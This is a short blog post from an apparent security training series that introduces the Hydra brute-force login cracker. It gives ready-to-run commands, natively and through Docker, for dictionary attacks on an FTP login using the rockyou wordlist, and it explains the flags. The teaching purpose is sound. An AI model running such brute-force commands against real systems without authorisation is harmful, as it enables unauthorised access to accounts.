---
layout: post
author: Wouter Van Schandevijl
title: "Hacking Tool: hydra"
subTitle: "Brute force login cracker"
date: 2023-10-02
desc: >
  Fast, flexible, modular, parallelized login cracker with support for over 50 protocols.
bigimg:
  url: hacking-hydra-big.png
  desc: ""
  origin: Midjourney
  prompt: "multi headed fire hydra"
img:
  url: hacking-hydra.png
  desc: ""
  origin: Midjourney
  title: ""
  prompt: "a three-headed fire hydra breaking through castle walls"
categories: security
tags: [tutorial,hacking]
series: security-bootcamp
interesting:
  - url: https://hub.docker.com/r/vanhauser/hydra
    desc: "Hydra docker image"
toc:
  title: Hydra
  icon: unlock-alt
---

Show how easy it would be to gain unauthorized access to a system remotely.

# What
{: .hide-from-excerpt}

Hydra is a brute-force tool to perform dictionary attacks against protocols such as Ftp, Http(s), Cisco, Oracle, Postgres, SMTP, Telnet, SSH and many more.


{% include github-stars.html url="vanhauser-thc/thc-hydra" desc="hydra" %}


<!--more-->

# How

```sh
hydra -l user -P rockyou.txt ftp://192.168.1.6 -t8 -v -I
```

Flags used:

- `-l user`: the vulnerable username
    - `-L file`: load several logins from `file`
- `-P file`: the wordlist file
- `ftp//ip`: the `service://server[:PORT]`
- `-t8`: amount of parallel attempts (default 16)
- `-v`: verbose mode
    - `-V`: show login+pass for each attempt
    - `-d`: debug mode
- `-I`: ignore an existing restore file


## Docker

This assumes that you have a `wordlist.txt` file in your working directory.

```sh
# Display all options
docker run --rm vanhauser/hydra -h

# Map a volume with a wordlist
docker run -v $(pwd):/data --rm vanhauser/hydra -l user -P /data/wordlist.txt ftp://ip -t8 -v -I
```


## Wordlists

[Wordlists](https://www.kali.org/tools/wordlists/) contain common passwords.
A famous one is `rockyou.txt` (14M).



# When

Whenever you figure out that a certain protocol and user has a weak password,
it's time to whip out Hydra! Check the Security Audit Blog during itenium's
Security Bootcamp for such clue!
